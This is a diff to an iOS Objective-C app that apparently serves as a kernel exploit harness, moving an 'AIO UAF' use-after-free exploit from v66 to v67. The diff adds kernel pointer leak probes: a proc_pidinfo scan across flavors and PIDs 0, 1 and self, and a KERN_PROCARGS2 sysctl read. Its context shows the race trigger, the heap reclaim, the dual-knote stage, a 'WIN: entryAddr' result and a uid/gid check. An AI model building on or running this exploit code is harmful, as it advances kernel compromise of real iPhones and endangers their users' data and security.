@@ -254,8 +254,8 @@ struct aio_race_state {
     ssize_t return_result;  // v47: aio_return result or aio_read errno (diagnostics)
 };
 
-// v66: v65 + multi-vector Phase 0 kernel pointer probe. v65's FastPath-only
-// probe hit exclusive-access (0xe00002c5) on iOS 26.2. v66 expands to four
+// v67: v66 + exhaustive proc_pidinfo (flavors 1-25 × PIDs 0/1/self) + KERN_PROCARGS2 sysctl probe.
+// v66's FastPath-only probe failed with exclusive-access on iOS 26.2.
 // independent leak channels: (A) sysctl tcp.info, (B) proc_pidinfo,
 // (C) non-FastPath IOKit enumeration, (D) mach_port_kobject. Each probe
 // dumps its full return buffer and scans for 0xFFFFFE/0xFFFFFF patterns.
@@ -588,7 +588,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     UIButtonConfiguration *aioConf = [UIButtonConfiguration filledButtonConfiguration];
     aioConf.baseBackgroundColor = [UIColor systemOrangeColor];
     self.aioUafButton.configuration = aioConf;
-    [self.aioUafButton setTitle:@"AIO UAF v66" forState:UIControlStateNormal];
+    [self.aioUafButton setTitle:@"AIO UAF v67" forState:UIControlStateNormal];
     [self.aioUafButton addTarget:self action:@selector(aioUafTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.aioUafButton];
 
@@ -5956,7 +5956,7 @@ static void *e2_free_and_ool_racer(void *arg) {
 
 #pragma mark - Phase 0: Multi-Vector Kernel Pointer Probe
 
-// v66 Phase 0: Multi-vector probe for kernel pointer leaks.
+// v67 Phase 0: Multi-vector probe for kernel pointer leaks.
 // Tests four independent channels; each is non-destructive and
 // failure in one does not block the others.
 
@@ -6124,49 +6124,65 @@ static void *e2_free_and_ool_racer(void *arg) {
     close(connFd); close(accepted); close(listenFd);
 }
 
-// Sub-test B: proc_pidinfo — dump task/bsd info structs
+// Sub-test B: proc_pidinfo — exhaustive flavor×PID scan for kernel pointers
 - (void)subtestProcPidinfo {
-    ProcPidinfoFn proc_pidinfo = (ProcPidinfoFn)dlsym(RTLD_DEFAULT, "proc_pidinfo");
-    if (!proc_pidinfo) {
-        [self appendLog:@"Phase0.B proc_pidinfo: symbol not available"];
-        return;
-    }
+    ProcPidinfoFn f = (ProcPidinfoFn)dlsym(RTLD_DEFAULT, "proc_pidinfo");
+    if (!f) { [self appendLog:@"Phase0.B: proc_pidinfo not available"]; return; }
 
-    [self appendLog:@"Phase0.B proc_pidinfo: querying self..."];
+    int pids[] = {0, 1, getpid()};
+    const char *pidLabels[] = {"kernel", "launchd", "self"};
+    size_t bufSize = 16384;
 
-    int pid = getpid();
-
-    // PROC_PIDTASKINFO = 4, returns proc_taskinfo (~232+ bytes)
-    // PROC_PIDTBSDINFO  = 3, returns proc_bsdinfo (~72+ bytes)
-    // PROC_PIDTASKALLINFO = 16, returns proc_taskallinfo (larger)
-
-    int flavors[] = {4, 3, 16}; // PROC_PIDTASKINFO, PROC_PIDTBSDINFO, PROC_PIDTASKALLINFO
-    const char *names[] = {"TASKINFO", "BSDINFO", "TASKALLINFO"};
-
-    for (int i = 0; i < 3; i++) {
-        // Large buffer: 2048 bytes to catch any over-read
-        size_t bufSize = 2048;
+    for (int pi = 0; pi < 3; pi++) {
+        int pid = pids[pi];
         uint8_t *buf = (uint8_t *)calloc(1, bufSize);
         if (!buf) continue;
 
-        int ret = proc_pidinfo(pid, flavors[i], 0, buf, (uint32_t)bufSize);
-        if (ret > 0) {
-            [self appendLog:[NSString stringWithFormat:@"Phase0.B %s: ret=%d bytes", names[i], ret]];
-            size_t scanSize = (size_t)ret;
-            // Scan beyond the declared size too — look for uninitialized kernel memory
-            size_t extraScan = MIN(bufSize, (size_t)ret + 256);
-            [self appendLog:[NSString stringWithFormat:@"Phase0.B %s[0..%zu]: %@",
-                names[i], MIN(scanSize, (size_t)128) - 1,
-                [self hexPreview:buf length:MIN(scanSize, (size_t)128)]]];
-            [self scanBufferForKernelPointers:buf length:extraScan label:[NSString stringWithFormat:@"pidinfo.%s", names[i]]];
+        int tested = 0;
+        for (int flavor = 1; flavor <= 25; flavor++) {
+            memset(buf, 0, bufSize);
+            int ret = f(pid, flavor, 0, buf, (uint32_t)bufSize);
+            if (ret <= 0 || ret >= (int)bufSize) continue;
+            tested++;
+            NSArray *hits = [self scanBufferForKernelPointers:buf length:(size_t)ret
+                label:[NSString stringWithFormat:@"pidinfo.f%d.p%d", flavor, pid]];
+            if (hits.count > 0) {
+                size_t dumpLen = MIN((size_t)ret, (size_t)256);
+                [self appendLog:[NSString stringWithFormat:@"Phase0.B *** HIT f=%d pid=%d ret=%d: %@",
+                    flavor, pid, ret, [self hexPreview:buf length:dumpLen]]];
+            }
+        }
+        [self appendLog:[NSString stringWithFormat:@"Phase0.B pid=%d(%s): %d/25 flavors returned data", pid, pidLabels[pi], tested]];
+        free(buf);
+    }
+}
+
+// Sub-test B2: sysctl KERN_PROCARGS2 — known vector for uninitialized kernel memory
+- (void)subtestKernProcargs {
+    [self appendLog:@"Phase0.B2 KERN_PROCARGS2: probing..."];
+
+    int mib[] = {CTL_KERN, KERN_PROCARGS2, 0}; // KERN_PROCARGS2=49 on recent xnu
+    for (int pid = 0; pid <= 2; pid++) {
+        mib[2] = pid;
+        size_t len = 65536;
+        uint8_t *buf = (uint8_t *)calloc(1, len);
+        if (!buf) continue;
+
+        if (sysctl(mib, 3, buf, &len, NULL, 0) == 0 && len > 0) {
+            [self appendLog:[NSString stringWithFormat:@"Phase0.B2 pid=%d: %zu bytes", pid, len]];
+            size_t dumpLen = MIN(len, (size_t)256);
+            [self appendLog:[NSString stringWithFormat:@"Phase0.B2 pid=%d[0..%zu]: %@",
+                pid, dumpLen - 1, [self hexPreview:buf length:dumpLen]]];
+            [self scanBufferForKernelPointers:buf length:len
+                label:[NSString stringWithFormat:@"kern.procargs2.p%d", pid]];
         } else {
-            [self appendLog:[NSString stringWithFormat:@"Phase0.B %s: failed (ret=%d errno=%d)", names[i], ret, errno]];
+            [self appendLog:[NSString stringWithFormat:@"Phase0.B2 pid=%d: failed (errno=%d)", pid, errno]];
         }
         free(buf);
     }
 }
 
-// Sub-test C: Non-FastPath IOKit service enumeration + memory mapping
+// Sub-test D (was C): Non-FastPath IOKit service enumeration + memory mapping
 - (void)subtestIOKitEnumeration {
     if (![self loadIOKitSymbols]) {
         [self appendLog:@"Phase0.C IOKit: symbols unavailable"];
@@ -6282,17 +6298,22 @@ static void *e2_free_and_ool_racer(void *arg) {
     NSMutableDictionary *result = [NSMutableDictionary dictionary];
     result[@"success"] = @YES;
 
-    [self appendLog:@"\n=== Phase 0 v66: Multi-Vector Kernel Pointer Probe ==="];
+    [self appendLog:@"\n=== Phase 0 v67: Multi-Vector Kernel Pointer Probe ==="];
 
-    // A: sysctl net.inet.tcp.info
+    // A: sysctl net.inet.tcp.info (CVE-2026-28867)
     [self appendLog:@"\n-- Phase0.A: sysctl net.inet.tcp.info --"];
     @try { [self subtestSysctlTcpInfo]; }
     @catch (NSException *e) { [self appendLog:[NSString stringWithFormat:@"Phase0.A exception: %@", e]]; }
 
-    // B: proc_pidinfo
-    [self appendLog:@"\n-- Phase0.B: proc_pidinfo --"];
+    // B: proc_pidinfo — exhaustive flavor×PID scan
+    [self appendLog:@"\n-- Phase0.B: proc_pidinfo (all flavors x 3 PIDs) --"];
     @try { [self subtestProcPidinfo]; }
     @catch (NSException *e) { [self appendLog:[NSString stringWithFormat:@"Phase0.B exception: %@", e]]; }
+
+    // B2: KERN_PROCARGS2 — known uninitialized kernel memory leak vector
+    [self appendLog:@"\n-- Phase0.B2: KERN_PROCARGS2 --"];
+    @try { [self subtestKernProcargs]; }
+    @catch (NSException *e) { [self appendLog:[NSString stringWithFormat:@"Phase0.B2 exception: %@", e]]; }
 
     // C: IOKit enumeration
     [self appendLog:@"\n-- Phase0.C: IOKit enumeration --"];
@@ -6328,10 +6349,10 @@ static void *e2_free_and_ool_racer(void *arg) {
         _aioLast = now;
     }
 
-    [self appendLog:@"\n========== AIO UAF v66 (Multi-Vector Phase 0 + Dual-Knote) =========="];
+    [self appendLog:@"\n========== AIO UAF v67 (Multi-Vector Phase 0 + Dual-Knote) =========="];
 
-    // ---- Phase 0 v66: Multi-vector kernel pointer probe ----
-    [self appendLog:@"\n--- Phase 0 v66: Multi-vector kernel pointer probe ---"];
+    // ---- Phase 0 v67: Multi-vector kernel pointer probe ----
+    [self appendLog:@"\n--- Phase 0 v67: Multi-vector kernel pointer probe ---"];
     NSDictionary *fpResult = [self runPhase0MultiVectorProbe];
     [self appendLog:[NSString stringWithFormat:@"Phase0 result: success=%@ copyEventOk=%@ uniquePtrs=%lu",
                      fpResult[@"success"], fpResult[@"copyEventOk"],
@@ -6347,19 +6368,19 @@ static void *e2_free_and_ool_racer(void *arg) {
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
         @autoreleasepool {
 
-    // v66: Diagnostic in Documents (persists across kernel panic / reboot)
+    // v67: Diagnostic in Documents (persists across kernel panic / reboot)
     NSString *docsDir = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
-    NSString *diagPath = [docsDir stringByAppendingPathComponent:@"diag_v66.txt"];
+    NSString *diagPath = [docsDir stringByAppendingPathComponent:@"diag_v67.txt"];
     unlink(diagPath.UTF8String);
 
-    // v66: SINGLE file — all AIO ops use same fd
-    NSString *aioPath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"aio_v66.bin"];
+    // v67: SINGLE file — all AIO ops use same fd
+    NSString *aioPath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"aio_v67.bin"];
     int fd = open(aioPath.UTF8String, O_CREAT | O_RDWR | O_TRUNC, 0644);
     if (fd < 0) {
         [self appendLog:@"FAIL: could not create file"];
         dispatch_async(dispatch_get_main_queue(), ^{
             self.aioUafButton.enabled = YES;
-            [self.aioUafButton setTitle:@"AIO UAF v66" forState:UIControlStateNormal];
+            [self.aioUafButton setTitle:@"AIO UAF v67" forState:UIControlStateNormal];
         });
         return;
     }
@@ -6373,8 +6394,8 @@ static void *e2_free_and_ool_racer(void *arg) {
     [self appendLog:[NSString stringWithFormat:@"diag=%@", diagPath]];
 
     uint64_t entryAddr = 0;
-    // ---- Phase A v66: Dual-knote — stale knote(kq) + fresh knote(kq2) ----
-    [self appendLog:@"\n--- Phase A v66: 7x prime → lio_listio trigger → racer → lio_listio batch reclaim → kevent64(kq) → kevent64(kq2) ---"];
+    // ---- Phase A v67: Dual-knote — stale knote(kq) + fresh knote(kq2) ----
+    [self appendLog:@"\n--- Phase A v67: 7x prime → lio_listio trigger → racer → lio_listio batch reclaim → kevent64(kq) → kevent64(kq2) ---"];
 
     bool phaseA_won = false;
     for (int attempt = 0; attempt < 10; attempt++) {
@@ -6470,8 +6491,8 @@ static void *e2_free_and_ool_racer(void *arg) {
 
     [self appendLog:[NSString stringWithFormat:@"\nWIN: entryAddr=0x%llx", entryAddr]];
 
-    // ---- Phase C v66: Health check ----
-    [self appendLog:@"\n--- Phase C v66: Health check ---"];
+    // ---- Phase C v67: Health check ----
+    [self appendLog:@"\n--- Phase C v67: Health check ---"];
     {
         struct aiocb hc[4];
         char hcbuf[4][256];
@@ -6497,11 +6518,11 @@ cleanup:
     close(fd);
     unlink(aioPath.UTF8String);
     [self appendLog:[NSString stringWithFormat:@"=== uid=%d gid=%d ===", getuid(), getgid()]];
-    [self appendLog:@"========== AIO UAF v66 Complete =========="];
+    [self appendLog:@"========== AIO UAF v67 Complete =========="];
             _aioRunning = 0;
             dispatch_async(dispatch_get_main_queue(), ^{
                 self.aioUafButton.enabled = YES;
-                [self.aioUafButton setTitle:@"AIO UAF v66" forState:UIControlStateNormal];
+                [self.aioUafButton setTitle:@"AIO UAF v67" forState:UIControlStateNormal];
             });
         }  // @autoreleasepool
     });  // dispatch_async
